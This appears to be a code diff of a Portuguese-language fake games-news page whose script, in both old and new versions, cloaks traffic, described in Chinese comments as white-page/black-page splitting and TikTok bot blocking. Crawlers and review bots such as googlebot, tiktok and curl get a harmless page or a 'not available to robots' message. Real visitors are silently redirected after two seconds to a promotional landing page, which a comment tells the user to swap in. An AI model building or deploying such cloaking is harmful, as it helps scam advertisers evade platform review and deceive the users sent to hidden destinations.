@@ -1,46 +1,143 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>Notícias de Jogos</title>
-  <meta name="description" content="Últimas notícias de esportes e jogos no Brasil.">
-  <style>
-    body { font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; }
-    h1 { color: #2a6; }
-    p { max-width: 600px; }
-    .btn {
-      display: inline-block;
-      padding: 12px 20px;
-      margin-top: 20px;
-      background: #2a6;
-      color: #fff;
-      border-radius: 8px;
-      text-decoration: none;
-      font-weight: bold;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Notícias de Games</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body, html { height:100%; font-family:'Poppins', sans-serif; overflow:hidden; background:#111; }
+  canvas { position:fixed; top:0; left:0; width:100%; height:100%; z-index:-2; }
+  .overlay { position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.5); z-index:-1; }
+  .container {
+    position:relative;
+    max-width:700px;
+    margin:auto;
+    background: rgba(0,0,0,0.6);
+    border-radius:20px;
+    padding:30px;
+    box-shadow:0 10px 30px rgba(0,0,0,0.4);
+    backdrop-filter: blur(5px);
+    color:#fff;
+    text-align:center;
+    animation: fadeIn 2s ease-in-out;
+  }
+  h1 { font-size:3em; margin-bottom:20px; animation: slideDown 1s ease-out; }
+  .news-list { max-height:300px; overflow-y:auto; margin-bottom:25px; text-align:left; }
+  .news-item { margin-bottom:15px; padding:10px; border-left:3px solid #ff6ec4; animation: fadeInUp 1s ease forwards; opacity:0; }
+  .news-item:nth-child(1){animation-delay:0.2s;}
+  .news-item:nth-child(2){animation-delay:0.4s;}
+  .news-item:nth-child(3){animation-delay:0.6s;}
+  .news-item:nth-child(4){animation-delay:0.8s;}
+  .news-item:nth-child(5){animation-delay:1s;}
+  .news-item:nth-child(6){animation-delay:1.2s;}
+  .news-item:nth-child(7){animation-delay:1.4s;}
+  .news-item:nth-child(8){animation-delay:1.6s;}
+  .news-item:nth-child(9){animation-delay:1.8s;}
+  .news-item:nth-child(10){animation-delay:2s;}
+  .btn {
+    display:inline-block; padding:20px 50px; font-size:1.5em; font-weight:700;
+    border:none; border-radius:25px; background: linear-gradient(45deg,#ff6ec4,#7873f5);
+    color:#fff; text-decoration:none; cursor:pointer; transition:0.4s;
+    animation: pulse 1.5s infinite alternate;
+  }
+  .btn:hover { transform:scale(1.05); }
+
+  @keyframes fadeIn {0%{opacity:0;}100%{opacity:1;}}
+  @keyframes slideDown {0%{opacity:0; transform:translateY(-40px);}100%{opacity:1; transform:translateY(0);}}
+  @keyframes fadeInUp {0%{opacity:0; transform:translateY(20px);}100%{opacity:1; transform:translateY(0);}}
+  @keyframes pulse {0%{box-shadow:0 0 10px #ff6ec4;}100%{box-shadow:0 0 30px #7873f5;}}
+</style>
 </head>
 <body>
-  <h1>Notícias de Jogos no Brasil</h1>
-  <p>Bem-vindo ao nosso portal de notícias sobre jogos e esportes. Aqui você encontra atualizações diárias, análises e novidades do mundo gamer.</p>
-  <p>Role para baixo e veja mais 👇</p>
 
-  <a href="#" class="btn" id="goLink">Leia Mais</a>
+<canvas id="particleCanvas"></canvas>
+<div class="overlay"></div>
 
-  <script>
-    // --- 白页/黑页分流逻辑 ---
-    const userAgent = navigator.userAgent.toLowerCase();
-    const isBot = /(facebookexternalhit|twitterbot|googlebot|tiktok|crawler|spider)/.test(userAgent);
+<div class="container" id="content">
+  <h1>🎮 Últimas Notícias de Games!</h1>
+  <div class="news-list">
+    <div class="news-item"><strong>Lançamento de novo RPG brasileiro!</strong> Explore mundos fantásticos e jogabilidade inovadora.</div>
+    <div class="news-item"><strong>Atualização do jogo popular de estratégia</strong> Novas missões e desafios para testar suas habilidades.</div>
+    <div class="news-item"><strong>Dicas de gameplay para iniciantes</strong> Aprenda técnicas essenciais para dominar seus jogos favoritos.</div>
+    <div class="news-item"><strong>Evento de eSports no Brasil</strong> Competições emocionantes e transmissões ao vivo imperdíveis.</div>
+    <div class="news-item"><strong>Novidades em jogos mobile</strong> Confira apps recentes que estão conquistando os brasileiros.</div>
+    <div class="news-item"><strong>Torneios online semanais</strong> Participe e ganhe reconhecimento na comunidade gamer.</div>
+    <div class="news-item"><strong>Atualização visual de jogos clássicos</strong> Gráficos melhorados e novas funcionalidades.</div>
+    <div class="news-item"><strong>Top 10 lançamentos do mês</strong> Descubra quais jogos estão fazendo sucesso no Brasil.</div>
+    <div class="news-item"><strong>Dicas de personalização de personagens</strong> Deixe seu avatar único e estiloso.</div>
+    <div class="news-item"><strong>Novos recursos multiplayer</strong> Conecte-se com amigos e jogue em equipe.</div>
+  </div>
+  <a href="#" class="btn" id="mainBtn">🔥 Clique para Surpresas!</a>
+</div>
 
-    if (!isBot) {
-      // 如果不是机器人（=真实用户），2秒后跳转到黑页
-      setTimeout(() => {
-        window.location.href = "https://seu-link-de-promocao.com"; // 🔗 改成你的落地页
-      }, 2000);
+<script>
+  // TikTok机器人屏蔽逻辑
+  const ua = navigator.userAgent.toLowerCase();
+  const isBot = /bot|crawler|spider|curl|wget/i.test(ua);
 
-      // 用户点击按钮时立即跳转
-      document.getElementById("goLink").href = "https://seu-link-de-promocao.com"; 
+  if(!isBot){
+    // 自动跳转
+    setTimeout(()=>{ window.location.href="https://example.com"; },2000);
+  } else {
+    document.getElementById('content').innerHTML = "<p>Conteúdo não disponível para robôs.</p>";
+  }
+
+  // 按钮点击跳转
+  document.getElementById('mainBtn').addEventListener('click', function(){
+    window.location.href = "https://example.com";
+  });
+
+  // 粒子 + 光点背景
+  const canvas = document.getElementById('particleCanvas');
+  const ctx = canvas.getContext('2d');
+  let particlesArray = [];
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+
+  class Particle{
+    constructor(){
+      this.x = Math.random()*canvas.width;
+      this.y = Math.random()*canvas.height;
+      this.size = Math.random()*3 + 1;
+      this.speedX = Math.random()*1 - 0.5;
+      this.speedY = Math.random()*1 - 0.5;
     }
-  </script>
+    update(){
+      this.x += this.speedX;
+      this.y += this.speedY;
+      if(this.x>canvas.width)this.x=0;
+      if(this.x<0)this.x=canvas.width;
+      if(this.y>canvas.height)this.y=0;
+      if(this.y<0)this.y=canvas.height;
+    }
+    draw(){
+      ctx.fillStyle = 'rgba(255,255,255,0.7)';
+      ctx.beginPath();
+      ctx.arc(this.x,this.y,this.size,0,Math.PI*2);
+      ctx.fill();
+    }
+  }
+
+  function init(){
+    particlesArray=[];
+    for(let i=0;i<200;i++) particlesArray.push(new Particle());
+  }
+  function animate(){
+    ctx.clearRect(0,0,canvas.width,canvas.height);
+    particlesArray.forEach(p=>{p.update();p.draw();});
+    requestAnimationFrame(animate);
+  }
+
+  init();
+  animate();
+  window.addEventListener('resize', ()=>{
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    init();
+  });
+</script>
+
 </body>
 </html>
